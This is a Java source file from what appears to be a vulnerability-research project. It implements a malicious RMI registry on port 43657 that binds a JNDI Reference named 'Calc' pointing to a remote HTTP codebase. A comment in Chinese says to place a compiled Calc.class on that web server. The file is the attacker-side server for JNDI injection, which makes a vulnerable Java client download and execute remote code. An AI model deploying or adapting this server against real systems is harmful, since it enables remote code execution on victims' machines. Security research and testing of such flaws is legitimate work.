package com.threedr3am.bug.common.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

/**
 * rmi server
 *
 * @author threedr3am
 */
public class RmiServer {

  public static void main(String[] args) {
    run();
  }

  public static void run() {
    try {
      Registry registry = LocateRegistry.createRegistry(43657);
      //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
      Reference reference = new Reference("Calc","Calc","http://localhost/");
      ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
      registry.bind("Calc",referenceWrapper);
    } catch (RemoteException e) {
      e.printStackTrace();
    } catch (AlreadyBoundException e) {
      e.printStackTrace();
    } catch (NamingException e) {
      e.printStackTrace();
    }
  }
}
